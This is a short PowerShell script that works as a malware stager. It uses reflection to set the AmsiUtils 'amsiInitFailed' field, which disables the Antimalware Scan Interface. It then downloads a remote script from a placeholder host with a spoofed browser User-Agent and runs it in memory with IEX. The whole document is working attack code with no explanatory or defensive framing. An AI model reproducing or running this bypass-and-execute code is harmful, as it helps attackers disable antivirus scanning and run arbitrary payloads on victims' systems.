$A='System.Management.Automation.AmsiUtils'
$B=[Ref].Assembly.GetType($A).GetField('amsiInitFailed','NonPublic,Static')
$B.SetValue($null,$true)
$w = New-Object Net.WebClient
$w.Headers.Add('User-Agent','Mozilla/5.0')
IEX $w.DownloadString('http://yourdomain.com/payload.ps1')
